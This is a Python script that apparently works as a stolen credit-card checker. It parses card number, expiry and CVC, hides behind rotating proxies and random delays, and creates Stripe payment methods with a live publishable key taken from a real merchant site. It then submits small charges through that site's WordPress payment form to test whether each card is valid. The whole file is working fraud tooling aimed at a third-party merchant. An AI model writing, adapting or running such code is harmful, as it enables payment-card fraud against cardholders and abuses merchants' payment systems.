import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))
        
        

        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }

        # data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=284765b7-69d6-481a-b4ed-9dd3277fbb75cd92ed&muid=953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0&sid=eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc&pasted_fields=number&payment_user_agent=stripe.js%2F064d3d4e55%3B+stripe-js-v3%2F064d3d4e55%3B+card-element&referrer=https%3A%2F%2Fkimsharris.com&time_on_page=28864&key=pk_live_51KigSfCPln27C4EmfOhhQpM0Ypdgk6MOvvj1PxqmzFg9haWYVDAo4fmwnxAtjD5Uy5xbRnfhXdMEvG1KumQfSfOs00KflBHGPx'
        data = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+card-element&referrer=https%3A%2F%2Facudetox.com&time_on_page=152236&key=pk_live_51PBnlrDPaQVax0KGyylGg5ThnhCqO0aOnAK1cExuOeDMCKFioHc4mMIAfIveKrh9C9a7UAtqcLaSgAhCOqyoSnvJ00XGhwDN9W"
        r1 = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxies=genProxy(),
        )

        pm = r1.json()["id"]
        

        cookies = {
            "__stripe_mid": "953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0",
            "__stripe_sid": "eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc",
        }

        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            # 'Cookie': '__stripe_mid=953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0; __stripe_sid=eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc',
            "Origin": "https://acudetox.com/",
            "Referer": "https://acudetox.com/group-training/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-GPC": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        params = {
            "t": "1731942669751",
        }

        data = f"data=__fluent_form_embded_post_id%3D1531%26_fluentform_5_fluentformnonce%3D556aec5d91%26_wp_http_referer%3D%252Fgroup-training%252F%26names%255Bfirst_name%255D%3Daung%26names%255Blast_name%255D%3Dzaw%26email%3Dzawaungkyaw21%2540gmail.com%26custom-payment-amount_2%3D1%26item-quantity%3D1%26input_radio%3Dno%26custom-payment-amount_3%3D0%26terms-n-condition%3Don%26payment_method%3Dstripe%26alt_s%3D%26jcvdim2373%3D76041%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=5"

        r2 = requests.post(
            "https://acudetox.com/wp-admin/admin-ajax.php",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=genProxy(),
        )
        
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
